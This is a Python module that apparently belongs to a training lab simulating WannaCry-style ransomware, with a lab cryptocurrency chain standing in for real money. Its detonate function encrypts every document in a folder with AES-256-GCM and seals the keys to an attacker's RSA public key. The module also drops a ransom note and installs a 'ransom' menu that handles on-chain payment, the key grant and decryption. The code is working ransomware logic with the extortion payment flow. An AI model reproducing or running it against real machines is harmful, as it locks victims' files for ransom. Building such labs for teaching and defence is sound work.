"""What the ransomware does on a victim.

On arrival: lock the documents, leave the ransom note, and leave the `ransom`
menu behind. From then on the victim works through that menu: create a wallet,
buy lab money, pay, receive the key, and decrypt by hand.

The menu arrives with the worm, like the window real ransomware shows only
after it has infected a machine. Nothing of this is installed on the victim
when the lab is built.
"""

import base64
import json
from pathlib import Path
import socket

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from . import chain, files, keys, paths, wallet

#: What a lab action may raise and have shown as a message instead of a crash.
ERRORS = (OSError, ValueError, KeyError, TypeError, AttributeError, RuntimeError)

NOTE = """Ooops, your documents are locked!

Every document in this folder has been encrypted and now carries the
extension .WNCRY. The key that unlocks them is held by the attacker.

To recover your documents, run the menu:

    ransom

It lets you create a wallet, buy lab money on the exchange, pay the ransom,
and receive your decryption key.
"""


def participant_id() -> str:
    """This machine's address, which is how a lab names its machines: 10.159.0.71.

    Falls back to the hostname when the address cannot be found.
    """
    try:
        return socket.gethostbyname(socket.gethostname())
    except OSError:
        return socket.gethostname()


def detonate(documents, attacker_pub_pem: str, chain_config: dict, home) -> int:
    """Run the ransomware on this machine. Returns the number of documents locked.

    The keys are written first, then the documents are replaced: if anything
    stops in between, the key record is already on the disk.
    """
    if paths.KEYLOG.exists():
        raise ValueError("this machine was already locked")
    folder = files.check_folder(documents)
    who = participant_id()
    attacker_pub = keys.load_pub_pem(attacker_pub_pem.encode("ascii"))

    victim_priv = keys.new_rsa_keypair()
    file_key = AESGCM.generate_key(bit_length=256)
    record = files.encrypt_all(folder, who, file_key)

    keys.write_json(paths.KEYLOG, {
        "participant_id": who,
        "documents": str(folder),
        "attacker_pub_pem": attacker_pub_pem,
        "victim_pub_pem": keys.pub_pem(victim_priv.public_key()).decode("ascii"),
        "victim_priv_sealed": keys.seal_with_rsa_pub(attacker_pub, keys.priv_pem_from(victim_priv)),
        "file_key_sealed": keys.seal_with_rsa_pub(victim_priv.public_key(), file_key),
        "files": record,
    }, private=True)
    files.apply_lock(folder, record)
    keys.write_json(paths.RECORD, {
        "participant_id": who, "state": "ENCRYPTED", "documents": str(folder),
    }, private=True)
    keys.write_json(paths.CHAIN, chain_config)
    (folder / paths.NOTE_NAME).write_text(NOTE, encoding="utf-8")
    drop_menu(home)
    return len(record)


def drop_menu(home):
    """Leave the victim a way in: `ransom` starts the menu from the arrived code."""
    command = paths.MENU
    command.parent.mkdir(parents=True, exist_ok=True)
    command.write_text(
        '#!/bin/bash\nPYTHONPATH={} exec python3 -m yom_ransomware "$@"\n'.format(home),
        encoding="utf-8",
    )
    command.chmod(0o755)


# ---- paying and getting the key back ----

def grant_file_key(keylog: dict):
    """Accept the reply, save the key, print the grant. Recover nothing.

    Recovery stays a separate, manual step, the way victims of the real
    ransomware ran a decryptor with the key they were given.
    """
    reply = keys.read_json(paths.REPLY)
    opened = keys.victim_accept_reply(reply, keylog)
    keys.write_json(paths.ACCEPTED, {
        "victim_priv_pem_b64": keys.b64(opened["victim_priv_pem"]),
        "file_key_b64": keys.b64(opened["file_key"]),
    }, private=True)
    print("Attacker reply accepted; file key unsealed with the recovered victim key.")
    print()
    print("=" * 60)
    print("  KEY GRANTED - YOUR DECRYPTION KEY (copy it):")
    print()
    print(f"  {keys.b64(opened['file_key'])}")
    print("=" * 60)
    print()
    print("Run the decryptor on this machine and paste this key when asked:")
    print("    ransom decrypt")
    print("It restores your documents and checks each against its original.")


def recovery_step(password=None):
    """One menu-driven step of the exchange, ending at the KEY GRANT.

      1. No request yet: build the on-chain request (the sealed victim key).
      2. With a wallet and the chain: register it on-chain with real payment,
         then wait for the attacker's reply.
      3. Reply present: accept it, unseal the file key, print KEY GRANTED.
    """
    if not paths.KEYLOG.exists():
        raise ValueError("nothing is locked on this machine")
    keylog = keys.read_json(paths.KEYLOG)

    if paths.REPLY.exists():
        grant_file_key(keylog)
        return

    if not paths.REQUEST.exists():
        request = keys.build_exchange_request(keylog)
        keys.write_json(paths.REQUEST, request, private=True)
        print("EXCHANGE REQUEST (this is what goes on the chain):")
        print(json.dumps(request, indent=2))

    # A registered request already has its on-chain id. This step must then
    # NEVER register again: the payment already happened.
    already_registered = keys.read_json(paths.REQUEST).get("request_id") is not None

    if paths.WALLET.exists() and paths.CHAIN.exists() and (password or already_registered):
        config = keys.read_json(paths.CHAIN)
        try:
            if already_registered:
                request = keys.read_json(paths.REQUEST)
                print(f"payment already made; waiting for the on-chain reply to request "
                      f"{request['request_id']} (no new payment)...")
                reply = chain.wait_reply(config, request["request_id"])
                paths.REPLY.write_text(json.dumps(reply, indent=2) + "\n", encoding="utf-8")
                print(f"attacker reply received on-chain; saved to {paths.REPLY}")
            else:
                chain.victim_exchange(config, paths.WALLET, password, paths.REQUEST, paths.STATE)
        except (OSError, RuntimeError, TimeoutError) as error:
            print(f"\nOn-chain exchange unavailable: {error}")
            print("Falling back to the manual copy path. Current instructions:")
        else:
            grant_file_key(keylog)
            return

    print("\nNext: on the attacker machine, turn the request into a reply with")
    print(f"    ransom reply --request <a copy of {paths.REQUEST}")
    print(f"then copy the printed reply to this machine as {paths.REPLY}")
    print("and choose document recovery again to accept it and get your key.")


def decrypt(pasted_key: str) -> int:
    """The decryptor: with the granted key, restore every document. Returns how many."""
    try:
        file_key = base64.b64decode(pasted_key.strip().encode("ascii"))
    except Exception:
        raise ValueError("that is not valid base64; copy the key exactly as printed")
    if len(file_key) != 32:
        raise ValueError(
            f"expected a 32-byte AES-256 key (got {len(file_key)} bytes); "
            "copy the full key exactly as printed"
        )
    keylog = keys.read_json(paths.KEYLOG)
    print()
    print("Decrypting with the pasted key:")
    names = files.unlock(Path(keylog["documents"]), keylog["participant_id"], file_key,
                         keylog["files"])
    for name in names:
        print(f"  {name}: restored, matches its original")
    print()
    print(f"{len(names)} documents recovered. The .WNCRY envelopes are gone.")
    return len(names)


def status():
    """One read-only look at this machine: contract, wallet, lock, request."""
    if paths.KEYLOG.exists():
        keylog = keys.read_json(paths.KEYLOG)
        state = files.inspect(Path(keylog["documents"]), keylog["files"])
        locked = sum(1 for value in state.values() if value.startswith("LOCKED"))
        print(f"documents: {locked} locked, in {keylog['documents']}  ({keylog['participant_id']})")
    else:
        print("documents: not locked")
    if not paths.CHAIN.exists():
        print("chain:     no chain config here")
        return
    config = keys.read_json(paths.CHAIN)
    try:
        config = wallet.connect()
        print(f"chain:     {config['rpc_url']} (chain {config['chain_id']})")
        contract = chain.discover_contract(config)
        code = wallet.rpc(config, "eth_getCode", [contract, "latest"])
        size = (len(code) - 2) // 2
        print(f"contract:  {contract}  ({size} bytes on chain"
              f"{', ALIVE' if size > 0 else ', DEAD: the deployment failed'})")
        if paths.WALLET.exists():
            address = wallet.wallet_address(paths.WALLET)
            balance = wallet.balance_wei(config, address)
            print(f"wallet:    {address}  {wallet.format_ether(balance)} lab ETH")
        else:
            print("wallet:    none yet (create one in the menu)")
        requests = chain.poll_requests(config)
        for entry in requests:
            print(f"chain:     request {entry['id']} from {entry['victim'][:10]}... "
                  f"{'ANSWERED' if entry['answered'] else 'waiting for the attacker'}")
        print(f"reply:     {'received (menu: document recovery grants the key)' if paths.REPLY.exists() else 'not received yet'}")
    except ERRORS as error:
        print(f"chain:     unreachable or wrong ({error})")
